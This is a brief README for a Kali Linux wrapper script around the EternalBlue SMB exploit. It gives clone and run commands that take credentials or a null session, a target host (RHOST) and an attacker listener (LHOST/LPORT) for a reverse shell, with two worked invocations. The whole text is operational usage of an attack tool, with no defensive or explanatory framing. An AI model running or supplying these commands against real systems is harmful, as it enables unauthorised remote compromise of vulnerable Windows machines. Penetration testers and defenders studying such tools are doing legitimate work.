USAge:

Description: A handy script for kali box only

1. Download the repo localy:
#git clone https://github.com/Ch0pin/EternalBlue.git

2. cd to EternalBlue and run

root@kali#./run.sh <username> <password> <LHOST> <LPORT> <RHOST> <Named_pipe>


In case of known username/password Run:

#./run.sh 'Chopin' 'password' 10.10.10.1 4444 10.10.10.2 Browser"

In case null session is allowed Run:

./run.sh '' '' 10.10.10.1 4444 10.10.10.2 ''


